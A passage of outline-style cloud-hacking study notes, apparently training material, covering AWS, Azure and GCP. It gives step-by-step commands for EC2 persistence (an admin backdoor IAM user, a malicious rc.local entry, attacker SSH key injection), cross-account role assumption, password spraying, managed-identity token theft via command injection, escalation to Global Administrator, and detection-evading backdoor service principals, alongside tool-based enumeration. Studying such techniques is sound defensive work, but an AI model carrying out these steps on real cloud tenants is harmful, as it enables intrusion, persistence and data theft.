			- Encrypting CloudTrail logs using a new encryption key
			- Moving CloudTrail logs to a new S3 bucket
			- Using AWS Lambda functions to delete newly recorded trail entries
		- Maintaining Persistent Access:
			- After clearing logs, attackers often establish persistent access to the cloud infrastructure. Common techniques include:
				- Manipulating user data associated with EC2 instances that have privileged access
				- Creating new EC2 instances based on an AMI and assigning them privileged roles
				- Modifying an existing Lambda function to insert a backdoor (e.g., a function that creates a new user when invoked)
				- Using Lambda functions to manipulate access keys, such as rabbit_lambda, cli_lambda, and backdoor_created_users_lambda
		- By employing these tactics, attackers can maintain long-term access to the AWS environment while minimizing the risk of detection.
	- Establishing Persistence on EC2 Instances:
		- Establishing persistence in EC2 instances involves ensuring continuous access to a compromised system, even after a reboot or an attempt to remove the attacker’s foothold. This technique is crucial for attackers to maintain their presence and continue malicious activities.
		- Techniques for Establishing Persistence on EC2 Instances:
			- Creating Backdoor Users:
				- Attackers can create new IAM users or roles with administrative privileges, ensuring they can regain access even if the original entry point is closed.
				- Steps to Create Backdoor Users in an EC2 Instance:
					- Step 1: Gain initial access to the EC2 instance with sufficient privileges.
					- Step 2: Use the AWS CLI or Management Console to create a new IAM user or role with administrative permissions using the following commands:
						aws iam create-user --user-name <Username>
						aws iam attach-user-policy --user-name <Username> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
					- Step 3: Store the access keys securely for future logins.
			- Altering Startup Scripts:
				- By modifying instance startup scripts (e.g., rc.local, init.d, systemd), attackers can ensure that their malicious code runs every time an instance is restarted, maintaining their presence in the system.
				- Steps to Alter Startup Scripts:
					- Step 1: Gain root or sudo access to the EC2 instance.
					- Step 2: Modify startup script files such as /etc/rc.local, /etc/init.d/, or systemd service files to include commands that execute malicious code.
						echo "/path/to/malicious/script.sh" >> /etc/rc.local
					- Step 3: Ensure the script has executable permissions.
						chmod +x /path/to/malicious/script.sh
			- SSH Key Injection:
				- Adding their own SSH keys to the ~/.ssh/authorized_keys file allows attackers to log in using SSH without requiring passwords, providing stealthy and persistent access.
				- Steps to Inject an Attacker’s SSH Key:
					- Step 1: Access the target EC2 instance with sufficient privileges.
					- Step 2: Add the attacker’s SSH public key to the ~/.ssh/authorized_keys file for the target user.
						echo "ssh-rsa <attacker_public_key>" >> ~/.ssh/authorized_keys
			- Installing Rootkits:
				- Deploying rootkits enables attackers to hide their malicious processes and files from standard system-monitoring tools, ensuring they can maintain privileged access without detection.
			- Leveraging IAM Roles:
				- Attackers may abuse existing IAM roles or policies to create new roles with elevated permissions or modify existing roles, allowing persistent access to other AWS resources.
				- Steps to Create New Malicious Roles in an AWS Environment:
					- Step 1: Enumerate existing IAM roles with elevated privileges.
					- Step 2: Use access to assume an existing role and create a new one with similar privileges.
						- aws iam create-role --role-name <Role-name> --assume-role-policy-document file://Test-Role-Trust-Policy.json
						- aws iam attach-role-policy --role-name <Role-name> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
					- Step 3: Use the new role to access other resources in the AWS environment.
		- These techniques highlight the various methods attackers may use to maintain their presence in EC2 instances, complicating efforts to fully remove their access and secure the AWS environment.
	- Lateral Movement: Moving Between AWS Accounts and Regions:
		- Lateral movement within AWS involves transitioning from one account or region to another to escalate privileges or gain access to additional resources. For successful lateral movement, attackers must have the necessary permissions to assume roles or access resources in the target account or region.
		- The following steps outline the process of lateral movement in AWS:
			- Step 1: Identifying IAM Roles with Permissive Policies or Trust Relationships:
				- An attacker first identifies IAM roles with permissive policies or trust relationships that allow cross-account or cross-region actions: aws iam list-roles
				- Once a role is identified, the attacker retrieves detailed information about it using: aws iam get-role --role-name <role-name>
				- This command returns information such as the role's path, GUID, ARN, and trust policy, which dictates who can assume the role.
			- Step 2: Assuming an IAM Role in the Target Account:
				- The attacker assumes an IAM role in the target account to gain additional permissions: aws sts assume-role --role-arn arn:aws:iam::<target-account-id>:role/<role-name> --role-session-name <session-name>
				- This command returns temporary security credentials, including the access key ID, secret access key, and session token.
			- Step 3: Configuring the AWS CLI with Temporary Credentials:
				- To execute actions with the permissions of the assumed role, the attacker configures the AWS CLI using the obtained temporary credentials:
					export AWS_ACCESS_KEY_ID=<AccessKeyId>
					export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
					export AWS_SESSION_TOKEN=<SessionToken>
			- Step 4: Enumerating Resources and Permissions in the Target Account:
				- With the assumed role, the attacker enumerates resources and permissions:
					- Listing available S3 buckets in the target account: aws s3 ls
					- Enumerating permissions associated with the target IAM user or role:
						aws iam list-attached-user-policies --user-name <assumed-user-name>  
						aws iam list-attached-role-policies --role-name <assumed-role-name>
			- Step 5: Enumerating AWS Regions for Further Lateral Movement:
				- After gaining access, the attacker identifies all available AWS regions to explore further movement: aws ec2 describe-regions
				- To enumerate instances in a specific region, they run: aws ec2 describe-instances --region <region-name>
			- Step 6: Accessing and Exploiting Resources in Different AWS Regions:
				- The attacker exploits resources across AWS regions, such as accessing S3 buckets: aws s3api list-buckets --query <filter>
				- If permissions allow, they may also launch new EC2 instances in other regions to expand their attack footprint.
	- AWSGoat: A Damn Vulnerable AWS Infrastructure (github.com):
		- AWSGoat is a deliberately vulnerable AWS infrastructure designed to help security professionals and ethical hackers develop their cloud exploitation skills. It provides a realistic, hands-on environment with various vulnerabilities that simulate real-world attack scenarios. By interacting with AWSGoat, users can gain practical experience in identifying and exploiting weaknesses within AWS environments, deepening their understanding of common vulnerabilities, and improving their ability to assess and secure cloud infrastructure.
		- The following are some of the attack scenarios that AWSGoat offers:
			- SQL Injection: Exploit vulnerabilities in the web application hosted within the AWSGoat environment to conduct SQL injection attacks.
			- ECS Breakout & Instance Metadata Exploitation: Escape a containerized environment to access the underlying host. Then, exploit the instance metadata service to retrieve IAM credentials associated with AWS instances.
			- Server-Side Request Forgery (SSRF): Perform an SSRF attack to extract the /etc/passwd file from the Lambda execution environment. Subsequently, compromise the environment to create a new user with administrator privileges.
			- IAM Privilege Escalation: Exploit misconfigured IAM policies to escalate privileges and gain administrator-level access to the AWS account.
			- File Upload Vulnerability & Task Metadata Exploitation: Gain shell access to the application by exploiting a file upload vulnerability. Then, retrieve AWS credentials from task metadata to achieve unauthorized access and control over the AWS environment.
- Microsoft Azure Hacking:
	- Azure Reconnaissance Using AADInternals (github.com):
		- AADInternals is a PowerShell module designed for administering Azure AD and Office 365. It provides a comprehensive set of tools for reconnaissance, exploitation, and post-exploitation tasks within an Azure AD environment.
		- Steps to Perform Azure Reconnaissance Using AADInternals:
			- Install and import the AADInternals module into the PowerShell session. Then, run the following command to start tenant reconnaissance for a given domain:
				- Invoke-AADIntReconAsOutsider -Domain <domain name> | Format-Table
				- This command retrieves all verified domains of the tenant and extracts relevant details, such as their type.
			- Retrieve login information for a specific user or domain by running: Get-AADIntLoginInformation -Domain <domain name>
			- List all registered domains for the tenant of a given domain: Get-AADIntTenantDomains -Domain <domain name>
		- Additional Commands for Reconnaissance Using AADInternals:
			- Get-AADIntEndpointInstances : Returns Office 365 instances and information about the latest changes.
			- Get-AADIntEndpointIps -Instance WorldWide : Retrieves Office 365 IP addresses and URLs for the specified instance.
			- Get-AADIntTenantDetails : Returns details for the specified tenant.
			- Get-AADIntTenantID -Domain <domain name> : Returns the tenant ID for a given user, domain, or access token.
			- Get-AADIntKerberosDomainSyncConfig -AccessToken : Fetches the tenant’s Kerberos domain sync configuration using the Azure AD Sync API.
			- Invoke-AADIntReconAsInsider : Initiates reconnaissance as an insider.
			- Get-AADIntOpenIDConfiguration -Domain <domain name> : Retrieves the OpenID configuration for a given user or domain.
			- Get-AADIntServiceLocations | Format-Table : Displays the tenant’s true service locations.
			- Get-AADIntServicePlans | Format-Table : Returns information about the tenant’s service plans, including name, ID, status, and first assigned date.
			- Get-AADIntSubscriptions : Retrieves the tenant’s subscription details, including name, ID, number of licenses, and creation date.
			- Get-AADIntCompanyTags -Domain <domain name> : Returns tags associated with the tenant.
			- Get-AADIntSyncConfiguration : Returns synchronization details.
			- Get-AADIntTenantAuthPolicy : Retrieves the tenant’s authorization policy, including user and guest settings.
			- Get-AADIntComplianceAPICookies : Returns cookies used for compliance API functions.
			- Get-AADIntAzureADPolicies : Displays Azure AD policies.
	- Identifying Azure Services and Resources (github.com):
		- Identifying Azure services and resources is crucial for attackers aiming to map the cloud environment and discover potential targets. By understanding the available services and resources, attackers can identify misconfigurations, vulnerabilities, and weaknesses to exploit. This reconnaissance phase is essential for planning further attacks, such as privilege escalation, lateral movement, or data exfiltration. Attackers can achieve this by leveraging Azure's APIs or exploiting exposed endpoints. Additionally, tools like Azure CLI and MicroBurst can be used to automate the process of enumerating resources and services within an Azure subscription.
		- Enumerating Azure Services and Resources Using MicroBurst:
			- Follow these steps to enumerate Azure services and resources using MicroBurst:
				- Import the MicroBurst module into an authenticated Azure PowerShell session: Import-Module .\MicroBurst.psm1
				- Create a folder to store the function’s output: New-Item -Name "microburst_output" -ItemType "directory"
				- Execute the MicroBurst function to enumerate Azure services and resources: Get-AzDomainInfo -Verbose -Folder microburst_output
					- This command retrieves enumeration results in CSV and text file formats, storing them in the specified output folder.
					- Open the output folder using File Explorer: explorer microburst_output:
					- This command opens the microburst_output folder, allowing access to the retrieved information for further analysis.
		- Note: Executing the above commands for Azure resource enumeration using MicroBurst does not require local administrative privileges. However, appropriate Azure AD and Azure Resource Manager (ARM) permissions are necessary. The user must have at least the Reader role to gather information about Azure resources.
	- Enumerating Azure Active Directory (AD) Accounts:
		- Cloud platforms such as Office 365 can be accessed directly from the Internet. Consequently, attackers target these environments to gather as much information as possible to initiate various attacks on Azure Active Directory (AD) and Office 365. Below, we discuss the techniques used to enumerate Azure AD accounts.
		- Account Enumeration:
			- Azure AD (AAD) users with access to Office 365 services can enumerate all user accounts and admin groups. This accessibility may motivate attackers to exploit Azure AD for account enumeration. Attackers can use tools such as AzureGraph to perform this enumeration.
			- AzureGraph (github.com):
				- AzureGraph is an Azure AD information-gathering tool that leverages Microsoft Graph APIs. It enables attackers to obtain various types of information from Azure AD, including users, devices, applications, and domains. The tool allows attackers to query this data via an API easily through a PowerShell console. Additionally, attackers can download all information from the target cloud and use it offline.
				- Enumerating Azure AD Accounts:
					- Use the following commands to enumerate Azure AD accounts:
					- Authenticate with AAD and create a new login session: gr <-create_graph_login()
					- View all users in the Azure AD tenant: gr$list_users()
					- Retrieve information about the authenticated user: me <-gr$get_user("username")
					- View the groups the authenticated user belongs to: head(me$list_group_memberships())
					- Retrieve applications owned by the authenticated user/account: me$list_owned_objects(type="application_name")
		- Password Spraying:
			- Attackers use password spraying to perform automated password guessing for Azure AD accounts. This method avoids account lockouts by attempting logins across multiple user accounts simultaneously using a single password. If both on-premises and cloud accounts share the same password without Multi-Factor Authentication (MFA), attackers have a high probability of gaining access to the target network through password spraying. Tools such as Spray365 are commonly used for this attack.
			- Spray365 (github.com):
				- Spray365 is a tool that allows attackers to identify valid credentials for Microsoft accounts (Office 365 / Azure AD). It helps in generating an execution plan, executing the password spraying attack, and reviewing the results.
				- Steps to Use the Spray365 Tool:
					- Generate an execution plan: python3 spray365.py generate normal -ep <execution_plan_filename> -d <domain_name> -u <file_containing_usernames> -pf <file_containing_passwords>
					- Perform password spraying using the execution plan: python3 spray365.py spray -ep <execution_plan_filename>
					- Review the results of the spraying operation: python3 spray365.py review <spray_results_json_filename>
	- Identifying Attack Surfaces Using Stormspotter (github.com):
		- Attackers use various techniques and tools to identify attack surfaces in a target Azure environment. By mapping these surfaces, they can design exploits to launch multiple attacks on a target system. One such tool is Stormspotter, which helps visualize Azure and Azure Active Directory (AAD) objects. Stormspotter creates a visual graph of an Azure subscription’s resources, allowing attackers to analyze attack surfaces and potential lateral movement paths within a tenant.
		- Stormcollector Module:
			- The Stormcollector module within Stormspotter enumerates all the subscriptions that the provided credentials can access. To view available options, use the -h switch.
			- Alternative Commands for Stormcollector:
				- Run Stormcollector in CLI mode: python3 sscollector.pyz cli
				- Run Stormcollector using a service principal for authentication: python3 sscollector.pyz spn -t <tenant> -c <clientID> -s <clientSecret>
					-t <tenant>: Specifies the Azure tenant ID.
					-c <clientID>: Specifies the service principal's client ID.
					-s <clientSecret>: Specifies the service principal's client secret.
		- Post-Authentication Enumeration:
			- Once authenticated, an attacker can enumerate resources, configurations, and security gaps within the Azure subscription. The CLI mode leverages existing Azure CLI authentication, while the service principal mode requires explicit credentials, allowing for more targeted enumeration.
	- Collecting Data from Azure AD and Azure RM using AzureHound (github.com):
		- Attackers use AzureHound to collect information from Azure Active Directory (Azure AD) and Azure Resource Manager (Azure RM) environments. This information can then be imported into BloodHound for better visualization.
		- AzureHound supports multiple authentication methods for data collection, including user credentials, a JSON Web Token (JWT), a refresh token, a service principal secret, or a service principal certificate. Additionally, authentication methods can be combined with various collection scoping options to tailor the data-gathering process to specific needs.
		- Steps to Collect Data from Azure AD and Azure RM using AzureHound:
			- Print all Azure tenant data (Azure AD/Azure RM) to the standard output stream: azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT"
				- Note: This step requires authentication to the tenant.
			- Save Azure tenant data to a file (e.g., JSON format): azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o "mytenant.json"
			- Start the data collection service for BloodHound:
				- azurehound configure
				- azurehound start
		- Note: Follow the prompts after executing azurehound configure, then proceed with azurehound start.
	- Accessing Publicly Exposed Blob Storage Using Goblob (github.com):
		- Goblob is a lightweight and fast enumeration tool designed to assist in the discovery of sensitive information that is publicly exposed in Azure blobs. This tool helps security professionals identify vulnerabilities by performing reconnaissance and vulnerability scanning.
		- Steps to Access Publicly Exposed Blob Storage Using Goblob:
			- Enumerate public Azure blob storage URLs for a single storage account:
				- Run the following command, replacing <storageaccountname> with the target storage account: ./goblob <storageaccountname>
				- This command targets a specific Azure storage account and enumerates publicly accessible blob storage URLs.
			- Enumerate public Azure blob storage URLs for multiple storage accounts:
				- Use a file containing a list of storage account names: ./goblob -accounts accounts.txt
				- Goblob will check each storage account listed in accounts.txt for publicly accessible blob storage URLs.
			- Enumerate a custom list of blob storage container names:
				- Specify both a list of storage account names and a custom list of container names: ./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt
				- Goblob will use the provided container names to construct and check potential blob storage URLs for each storage account.
			- Save output results to a file:
				- Run the following command to print the results into a file (e.g., results.txt): ./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt -output results.
	- Identifying Open Network Security Groups (NSGs) in Azure:
		- Attackers can exploit open Network Security Groups (NSGs) in Azure to gain unauthorized access by targeting ports with unrestricted traffic. When NSG rules allow inbound traffic from any IP address on commonly used ports—such as SSH (port 22), HTTP (port 80), HTTPS (port 443), or database ports like MySQL (port 3306)—these services become exposed to the Internet.
		- Attackers can scan for open ports and exploit them to launch brute-force attacks on SSH, execute malicious commands, exfiltrate data, or establish persistence within the network. Additionally, open NSGs can be leveraged to exploit vulnerabilities such as SQL injection, cross-site scripting (XSS), or remote code execution (RCE), leading to unauthorized access, data breaches, and deeper penetration into the Azure environment.
		- Methods for Identifying Open NSGs in Azure:
			- Using Azure Portal:
				- Navigate to the Azure Portal.
				- In the left-hand menu, select "All services", then search for and select "Network security groups".
				- Choose the NSG you want to review from the list.
				- In the NSG settings, select "Inbound security rules" or "Outbound security rules" to inspect the configured rules.
				- Identify any rules allowing access from 0.0.0.0/0, which indicates unrestricted traffic from any IP address.
			- Using Azure CLI:
				- Run the following commands in Azure CLI to analyze NSG configurations:
					- List all NSGs in the subscription: az network nsg list --output table
					- This command displays a table with details of NSGs, including names, resource groups, and locations.
				- View details of a specific NSG, including its security rules:
					- az network nsg show --resource-group <ResourceGroupName> --name <NSGName>
				- List all security rules within a specific NSG:
					- az network nsg rule list --resource-group <ResourceGroupName> --nsg-name <NSGName> --output table
					- Review the security rules and check for those with overly permissive configurations, especially those allowing inbound traffic from 0.0.0.0/0.
				- Filter security rules to find those allowing inbound access from any IP address:
					- az network nsg rule list --resource-group <ResourceGroupName> --nsg-name <NSGName> --query "[?direction=='Inbound' && sourceAddressPrefix=='*']" --output table
					- This command queries NSG rules to identify inbound rules where the source address prefix is set to any IP address (0.0.0.0/0).
		- By using these methods, security teams can detect and remediate open NSGs, minimizing the risk of unauthorized access and potential attacks in an Azure environment.
	- Exploiting Managed Identities and Azure Functions:
		- Attackers can potentially exploit managed identities to authenticate with any service that supports Azure AD authentication without manually managing login details. This allows them to gain unauthorized access to resources, execute malicious code, or exfiltrate sensitive data by impersonating legitimate services.
		- Attackers can follow these steps to exploit managed identities and Azure Functions:
			- Command Injection to Obtain an Access Token:
				- Run the following command to exploit a command injection vulnerability in a web application (Azure Function) and access $IDENTITY_ENDPOINT, obtaining the access token and client ID for Azure authentication: curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"
			- Install Azure PowerShell and Authenticate:
				- Execute the following commands to install the Azure PowerShell module and authenticate using the obtained access token:
					Install-Module -Name Az -Repository PSGallery -Force
					Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>
			- Enumerate Accessible Resources:
				- Run this command to list the resources the managed identity has access to: Get-AzResource
			- Check Storage Account Permissions:
				- Execute the following command to check if the managed identity has permission to retrieve storage account keys: Get-AzStorageAccountKey -ResourceGroupName "<resource_group>" -AccountName "<account_name>"
				- If successful, this command returns two storage account keys.
			- Access the Storage Account:
				- Use the obtained keys to connect to the storage account through Azure Storage Explorer.
			- Enumerate Storage Containers:
				- After connecting, search for available containers in the storage account.
			- Locate Sensitive Information:
				- Attackers can explore multiple containers, including those used by the web application. Some containers may contain sensitive data, such as security tokens or confidential files.
	- Privilege Escalation Using Misconfigured User Accounts in Azure AD:
		- Below are the steps involved in exploiting misconfigured user accounts in an Azure AD environment.
			- Step 1:
				- The attacker identifies a normal user account in Azure AD using tools such as BloodHound or AzureHound.
			- Step 2:
				- The attacker installs the Azure AD PowerShell module and logs in using a normal user account by running the following command: Connect-AzureAD
			- Step 3:
				- The attacker creates a new key credential for the application and stores it on the local machine using the following commands:
					$pwd = <password>
					$path = <thumbprint>
					Export-PfxCertificate -cert $path -FilePath <path_to_save_.pfx> -Password $pwd
			- Step 4:
				- The attacker uploads the self-signed certificate to Azure AD in the certificate section of the registered application.
			- Step 5:
				- The attacker authenticates to Azure AD using the newly created certificate and escalates the privileges of the normal user account to Global Administrator by running the following commands:
					Connect-AzureAD -TenantId <tenant_id> -ApplicationId <app_id> -CertificateThumbPrint <thumbprint>
					Add-AzureADDirectoryRoleMember -RefObjectId <normal_user_object_ID> -ObjectId <Global_admin_ID>
			- Step 6:
				- After successfully escalating privileges, the attacker verifies in Azure AD that the normal user now has the Global Administrator role. With these elevated privileges, the attacker can further exploit the target Azure AD environment.
		- Note: Steps 3–5 require significant privileges, typically available only to administrators or users with high-level directory management permissions. Without these elevated privileges, the commands will not succeed, making them critical to the privilege escalation process.
	- Creating Persistent Backdoors in Azure AD Using Service Principals:
		- The primary goal of creating backdoors using Azure AD roles is to maintain persistent access to an organization's cloud resources while minimizing detection. By exploiting Azure AD roles, attackers can establish long-term access, gain elevated permissions for malicious activities, and evade traditional security mechanisms. To achieve this, they can assign privileged roles to themselves or a controlled user/service principal. Tools such as Azure CLI, PowerShell, and BloodHound can facilitate this process.
		- Steps to Establish Persistence Using Azure CLI:
			- Once an attacker has identified and obtained access to a target user account, they can execute the following steps using Azure CLI:
			- Step 1: Identify the Target Role:
				- Run the following command to list all available roles in the Azure environment: az role definition list --output table
				- This helps identify the appropriate role for backdoor creation.
			- Step 2: Create a New Service Principal:
				- Execute the following command to generate a new service principal: az ad sp create-for-rbac --name <service-principal-name>
				- This returns details such as the client ID and secret.
			- Step 3: Assign a Privileged Role:
				- Assign a privileged role to the newly created service principal: az role assignment create --assignee <service-principal-id> --role <role-name>
				- For example, to assign the “Owner” role: az role assignment create --assignee <service-principal-id> --role "Owner"
			- Step 4: Verify the Role Assignment:
				- Confirm the role assignment using: az role assignment list --assignee <service-principal-id> --output table
			- Step 5: Enhance Persistence and Avoid Detection:
				- To evade detection, use inconspicuous naming conventions such as “ProductionServicePrincipal.” Additionally, assign multiple roles to different service principals and periodically rotate credentials: az ad sp credential reset --name <service-principal-id>
		- Conclusion: Creating backdoors with Azure AD roles is a sophisticated technique that allows attackers to maintain stealthy, long-term access to cloud environments. By leveraging legitimate roles and permissions, they can remain undetected while retaining control over compromised environments.
		- Note: These commands require elevated privileges, typically granted by the Directory.ReadWrite.All and RoleManagement.ReadWrite.Directory permissions in Azure AD.
	- Exploiting VNet Peering Connections (www.microsoft.com):
		- Virtual Network (VNet) peering in Azure allows seamless connectivity between two or more virtual networks, enabling virtual machines to communicate efficiently. However, attackers can exploit VNet peering to move laterally within a network and gain unauthorized access to critical resources. This can lead to malicious activities such as data exfiltration and persistent access.
		- Steps Attackers Can Take to Exploit VNet Peering Connections:
			- Create Unauthorized Peering Connections:
				- az network vnet peering create -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --remote-vnet TargetVnetId --allow-vnet-access
				- Attackers can establish unauthorized VNet peering to create a network path between an attacker-controlled VNet and a target VNet.
			- Enable Traffic Forwarding:
				- az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --allow-forwarded-traffic true
				- Once the VNets are peered, attackers can enable traffic forwarding to allow communication between compromised and target VMs.
			- Use Remote Gateways:
				- az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --set useRemoteGateways=true
				- Attackers can configure the peering connection to use remote gateways, granting access to additional networks or on-premises resources.
			- Enable Gateway Transit:
				- az network vnet peering update -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet --set allowGatewayTransit=true
				- If the target VNet uses a VPN gateway, attackers can enable gateway transit to route traffic through it, gaining access to external networks.
			- Delete Legitimate Peerings:
				- az network vnet peering delete -g TargetResourceGroup -n TargetVnetToAnotherVnet --vnet-name TargetVnet
				- To disrupt network traffic and reroute it through malicious paths, attackers can remove legitimate peering connections.
			- Synchronize Peering Connections:
				- az network vnet peering sync -g TargetResourceGroup -n AttackerVnetToTargetVnet --vnet-name AttackerVnet
				- Attackers can synchronize changes across peered VNets to ensure their configurations remain enforced.
		- By manipulating VNet peering settings, attackers can create stealthy communication paths, bypass security controls, and maintain unauthorized access within an Azure environment. Organizations should implement strict access controls, audit network configurations regularly, and monitor for suspicious changes to prevent such exploitation.
	- AzureGoat – Vulnerable-by-Design Azure Infrastructure (github.com):
		- AzureGoat is a vulnerable-by-design Azure infrastructure that demonstrates the latest OWASP Top 10 web application security risks (2021) and common misconfigurations in services such as App Functions, CosmosDB, Storage Accounts, Automation, and Identities. The tool allows security professionals and attackers to simulate real-world infrastructure while intentionally incorporating vulnerabilities. It provides multiple privilege escalation paths and follows a black-box testing approach.
		- Below are various scenarios where attackers can use AzureGoat to practice and refine their attack techniques:
			- Insecure Direct Object Reference (IDOR): Exploit insecure direct object reference vulnerabilities to gain unauthorized access to user accounts and modify credentials.
			- Server-Side Request Forgery (SSRF): Execute SSRF attacks to abuse server functionality, enabling unauthorized access to or modification of resources.
			- Security Misconfiguration: Identify misconfigurations that expose sensitive information in Azure resource groups. Attackers can exploit these weaknesses to retrieve storage container lists and scan for open network ports.
			- Privilege Escalation: Exploit misconfigurations to escalate privileges and gain ownership of resource groups.
- Google Cloud Hacking:
	- Enumerating GCP Resources Using Google Cloud CLI:
		- Enumerating Google Cloud Platform (GCP) involves systematically discovering all resources, services, configurations, and permissions within a GCP environment. This process helps attackers identify critical assets, spot misconfigurations, and uncover various vulnerabilities. By understanding the layout and permissions of the environment, attackers can exploit weaknesses to gain unauthorized access, escalate privileges, and potentially exfiltrate sensitive data.
		- Enumerating GCP Organizations, Projects, and Cloud Storage Buckets:
			- Enumerating GCP organizations, projects, and cloud storage buckets helps attackers map the cloud infrastructure, discover all projects, and identify misconfigured or publicly accessible buckets. This enables them to extract valuable data, exploit access control weaknesses, and gain unauthorized access to sensitive information.
			- Attackers can use the following commands for this purpose:
				- List organizations accessible by the target user account:
					- gcloud organizations list
					- This command displays a list of organizations associated with the target user account, including their organization IDs.
				- View all folders within a specified organization:
					- gcloud resource-manager folders list --organization=<organization_id>
					- This command lists all folders the user has access to within the specified organization.
				- Identify all active projects where the current account has owner, editor, browser, or viewer permissions:
					- gcloud projects list
				- List all Cloud Storage buckets within the default project:
					- gsutil ls
					- To list buckets for a specific project, attackers can use the -p flag followed by the project ID.
				- Retrieve the IAM permissions on a specific Cloud Storage bucket:
					- gsutil iam get gs://<bucket_name>
				- List the contents of a Cloud Storage bucket, including objects and subdirectories:
					- gsutil ls gs://<bucket_name>
					- Attackers can use the -r flag to recursively list all contents within the bucket.
		- Enumerating Google Cloud Service Accounts:
			- Enumerating Google Cloud service accounts allows attackers to identify accounts and their associated permissions. This can expose high-privileged accounts, potentially leading to unauthorized access or privilege escalation. Exploiting these vulnerabilities may result in infrastructure compromises and data theft.
			- Attackers can use the following commands to list service accounts in a target Google Cloud project:
				- List all service accounts in the current project:
					- gcloud iam service-accounts list
					- To retrieve details for a specific project, use the --project flag with the project ID.
				- Find all roles assigned to a service account:
					- gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" --format='table(bindings.role)' --filter="bindings.members:<service-account-email>"
				- Retrieve an access token for a target service account:
					- gcloud auth print-access-token --impersonate-service-account=<service-account-email>
		- Enumerating Google Cloud Resources:
			- Enumerating Google Cloud resources, such as Compute Engine and Cloud SQL instances, can expose critical infrastructure details. Attackers may identify virtual machines, operating systems, open ports, network configurations, and publicly accessible services within Compute Engine instances by exploiting weak security settings or outdated software. Similarly, in Cloud SQL instances, attackers can determine database versions and access settings, potentially targeting weak passwords, excessive permissions, or unpatched vulnerabilities.
			- Below are some common commands used to enumerate instances:
				- List all Compute Engine instances in a project: gcloud compute instances list
				- Retrieve detailed information about a specific Compute Engine virtual machine in a given zone: gcloud compute instances describe <instance_name> --zone=<zone>
				- List the service accounts associated with a Compute Engine instance: gcloud compute instances describe <instance_name> --zone=<zone> --format="table(serviceAccounts.scopes)"
				- View all Cloud SQL instances in the current project: gcloud sql instances list
				- Enumerate all SQL databases associated with a specific instance: gcloud sql databases list --instance=<instance_name>
		- Enumerating Google Cloud IAM Roles and Policies:
			- By analyzing roles and policies, attackers can identify accounts with excessive privileges, misconfigured access controls, and permission hierarchies. This knowledge enables them to exploit overprivileged accounts and gain access to sensitive data and resources.
			- Attackers can use the following commands to enumerate IAM roles and policies in a targeted Google Cloud environment:
				- List predefined or custom roles for an organization or project:
					- gcloud iam roles list [--show-deleted] [--organization=<organization>] [--project=<project_id>]
					- The --show-deleted flag includes deleted roles in the results.
				- Retrieve metadata, including permissions, of a specified IAM role:
					- gcloud iam roles describe <role_id> [--organization=<organization>] [--project=<project_id>]
				- Get IAM policies:
					- For an organization: gcloud organizations get-iam-policy <organization_id>
					- For a project: gcloud projects get-iam-policy <project_id>
					- For a folder: gcloud resource-manager folders get-iam-policy <folder_id>
			- Note: While these commands do not require full administrator privileges, they do require specific elevated permissions, which are typically assigned to certain roles.
		- Enumerating Google Cloud Services Using gcp_service_enum (github.com):
			- gcp_service_enum is a Python script that allows users to discover various Google Cloud Platform (GCP) services, including Compute Engine instances and Cloud Storage buckets. This tool can help identify publicly accessible resources and misconfigurations within a targeted Google Cloud account by using a service account key file.
			- To enumerate services on a targeted GCP account and save the results to a file, run the following command: python gcp_enum_services.py -f <service-account-key-file> --output-file <output-file>
		- Enumerating GCP Resources Using GCP Scanner (github.com):
			- Attackers use GCP Scanner to assess the level of access associated with specific credentials within Google Cloud Platform (GCP) and to evaluate the impact of compromised VMs, containers, GCP service accounts, or leaked OAuth2 token keys. The tool supports a wide range of GCP resources, including Compute Engine (GCE), Cloud Storage (GCS), Kubernetes Engine (GKE), App Engine, Cloud SQL, BigQuery, Spanner, Pub/Sub, Cloud Functions, Bigtable, Cloud Store, KMS, and other Cloud Services.
			- GCP Scanner can extract and utilize credentials such as:
				- GCP VM instance metadata
				- User credentials from gcloud profiles
				- OAuth2 Refresh Tokens with cloud-platform scope
				- GCP service account keys in JSON format
			- By leveraging these capabilities, attackers can gain insights into permissions and potential vulnerabilities, enabling more targeted and effective exploitation strategies within the Google Cloud environment.
			- Command Usage:
				- Attackers can execute the following command to scan and enumerate various resources and permissions within a target GCP environment: python3 scanner.py -o <output_file> -g <gcloud_profile_path>
				- Where:
					-o : Specifies the output file where the results will be saved.
					-g : Specifies the path to the gcloud profile containing the credentials to be used for scanning.
	- Enumerating Google Cloud Storage Buckets Using cloud_enum (github.com):
		- The cloud_enum tool is a multi-cloud OSINT tool that enables security researchers to enumerate public resources across AWS, Azure, and Google Cloud environments. Using this tool, researchers can retrieve information from open or publicly accessible GCP buckets, Firebase Realtime Databases, Google App Engine sites, cloud functions, and open Firebase applications, helping them assess potential security risks.
		- To enumerate Google Cloud Storage Buckets using the cloud_enum tool, run the following command: cloud_enum.py -k <keyword> --disable-aws --disable-azure
			- In this command:
				- The -k <keyword> option specifies the keyword to search for.
				- The --disable-aws and --disable-azure flags skip AWS and Azure checks, making the Google Cloud Storage enumeration process faster.
		- Alternatively, researchers can use the GrayhatWarfare tool to identify and access publicly available storage buckets on Google Cloud Platform.
	- Enumerating Privilege Escalation Vulnerabilities Using the GCP Privilege Escalation Scanner (github.com):
		- The GCP Privilege Escalation Scanner is a Python script that attackers can use to identify potential privilege escalation vulnerabilities within GCP environments. This scanner analyzes IAM policies and permissions across GCP resources to detect misconfigurations and weaknesses that could allow an attacker to gain elevated privileges.
		- Below are the steps an attacker would follow to enumerate privilege escalation vulnerabilities in a targeted GCP project using the GCP Privilege Escalation Scanner:
			- Enumerate Member Permissions:
